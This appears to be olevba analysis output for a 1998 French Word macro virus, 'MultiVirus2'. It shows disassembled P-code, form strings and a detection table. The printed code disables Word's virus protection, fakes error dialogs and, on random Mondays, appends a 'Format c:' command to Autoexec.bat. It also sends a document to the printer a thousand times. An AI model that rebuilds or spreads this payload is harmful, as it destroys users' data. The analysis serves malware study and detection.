' 	LitStr 0x00C2 "                                                                                                                                                   Lontong Micro Device © 1998 par ZeMacroKiller98"
' 	St StatusBar 
' Line #163:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #164:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #165:
' 	LitStr 0x0008 "Comptage"
' 	LitStr 0x000E "DernActivation"
' 	LitStr 0x0001 "1"
' 	LitStr 0x0007 "Win.ini"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #166:
' 	EndIfBlock 
' Line #167:
' 	Label ErrorPI 
' Line #168:
' 	EndSub 
' Line #169:
' 	FuncDefn (Private Sub PayIncar())
' Line #170:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #171:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #172:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #173:
' 	OnError ErrorPIn 
' Line #174:
' 	Dim 
' 	VarDefn MyDate
' 	VarDefn MyYear
' Line #175:
' 	Ld Date 
' 	St MyDate 
' Line #176:
' 	Ld MyDate 
' 	ArgsLd Year 0x0001 
' 	St MyYear 
' Line #177:
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0000 
' Line #178:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #179:
' 	LitStr 0x0027 "Pour en finir avec, je voudrais dire..."
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #180:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #181:
' 	LitStr 0x0031 "Pour me défier, il faut s'attirer mon courroux..."
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #182:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #183:
' 	LitStr 0x0017 "Je suis ZeMacroKiller98"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #184:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #185:
' 	LitStr 0x0016 "Je suis MultiVirus2..."
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #186:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #187:
' 	LitStr 0x0019 "Je ne serai pas refusé!!!"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #188:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #189:
' 	Ld MyYear 
' 	LitStr 0x000F "ZeMacroKiller98"
' 	Concat 
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #190:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #191:
' 	Label ErrorPIn 
' Line #192:
' 	EndSub 
' Line #193:
' 	FuncDefn (Sub PayMon())
' Line #194:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #195:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #196:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #197:
' 	OnError ErrorPM 
' Line #198:
' 	Dim 
' 	VarDefn MyDate
' 	VarDefn MyWeek
' Line #199:
' 	Ld Date 
' 	St MyDate 
' Line #200:
' 	Ld MyDate 
' 	Ld vbMonday 
' 	ArgsLd WeekDay 0x0002 
' 	St MyWeek 
' Line #201:
' 	ArgsCall Read 0x0000 
' Line #202:
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St N$ 
' Line #203:
' 	Ld MyWeek 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #204:
' 	GoTo Charge 
' Line #205:
' 	ElseBlock 
' Line #206:
' 	GoTo fin 
' Line #207:
' 	Label Charge 
' Line #208:
' 	Ld N$ 
' 	SelectCase 
' Line #209:
' 	LitDI2 0x0001 
' 	Case 
' 	LitDI2 0x0003 
' 	Case 
' 	LitDI2 0x0005 
' 	Case 
' 	LitDI2 0x0007 
' 	Case 
' 	LitDI2 0x0009 
' 	Case 
' 	LitDI2 0x000B 
' 	Case 
' 	LitDI2 0x000D 
' 	Case 
' 	LitDI2 0x000F 
' 	Case 
' 	LitDI2 0x0011 
' 	Case 
' 	LitDI2 0x0013 
' 	Case 
' 	CaseDone 
' Line #210:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #211:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "echo off"
' 	PrintItemNL 
' Line #212:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "cls"
' 	PrintItemNL 
' Line #213:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "echo o|Format c: /u"
' 	PrintItemNL 
' Line #214:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0032 "echo Votre disque c: a été formaté, HAHAHAHAHA!!!!"
' 	PrintItemNL 
' Line #215:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #216:
' 	EndSelect 
' Line #217:
' 	LitStr 0x0014 "ZeMacroKiller98 dit:"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x001C "Allez-y! C'est mon jour! ! !"
' 	Concat 
' 	Ld vbInformation 
' 	LitStr 0x000B "MultiVirus2"
' 	ArgsCall MsgBox 0x0003 
' Line #218:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #219:
' 	LitStr 0x0021 "Ceci est le virus MultiVirus2!!!!"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #220:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	For 
' Line #221:
' 	Ld ActiveDocument 
' 	ArgsMemCall PrintOut 0x0000 
' Line #222:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #223:
' 	EndIfBlock 
' Line #224:
' 	Label fin 
' Line #225:
' 	Label ErrorPM 
' Line #226:
' 	EndSub 
' Line #227:
' 	FuncDefn (Sub ToolsMacro())
' Line #228:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #229:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #230:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #231:
' 	OnError ErrorTM 
' Line #232:
' 	Ld MessageBox 
' 	ArgsMemCall Show 0x0000 
' Line #233:
' 	Label ErrorTM 
' Line #234:
' 	EndSub 
' Line #235:
' 	FuncDefn (Sub ViewVBCode())
' Line #236:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #237:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #238:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #239:
' 	OnError ErrorVVBC 
' Line #240:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #241:
' 	Label ErrorVVBC 
' Line #242:
' 	EndSub 
' Macros/VBA/MessageBox - 1616 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #2:
' 	Ld MessageBox 
' 	ArgsCall Unlock 0x0001 
' Line #3:
' 	EndSub 
' Line #4:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #5:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #6:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #8:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.MultiVirus.2' - OLE stream: 'Macros/MessageBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ZeMacroKiller98 ' 98�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.MultiVirus.2' - OLE stream: 'Macros/MessageBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.MultiVirus.2' - OLE stream: 'Macros/MessageBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ce virus est d�dicac� � tous mes meilleurs amis:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.MultiVirus.2' - OLE stream: 'Macros/MessageBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.MultiVirus.2' - OLE stream: 'Macros/MessageBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~ S�bastien, St�phane, J�r�me, etc... ~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.MultiVirus.2' - OLE stream: 'Macros/MessageBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.MultiVirus.2' - OLE stream: 'Macros/MessageBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ce sont des amis vraiment COOL et surtout S�bastien
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.MultiVirus.2' - OLE stream: 'Macros/MessageBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.MultiVirus.2' - OLE stream: 'Macros/MessageBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�J'esp�re qu'il resteront toujours mes amis...�J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.MultiVirus.2' - OLE stream: 'Macros/MessageBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.MultiVirus.2' - OLE stream: 'Macros/MessageBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�OK, d'accord�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.MultiVirus.2' - OLE stream: 'Macros/MessageBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.MultiVirus.2' - OLE stream: 'Macros/MessageBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.MultiVirus.2' - OLE stream: 'Macros/MessageBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.MultiVirus.2' - OLE stream: 'Macros/MessageBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.MultiVirus.2' - OLE stream: 'Macros/MessageBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Virus.MSWord.MultiVirus.2' - OLE stream: 'Macros/MessageBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.MultiVirus.2' - OLE stream: 'Macros/MessageBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

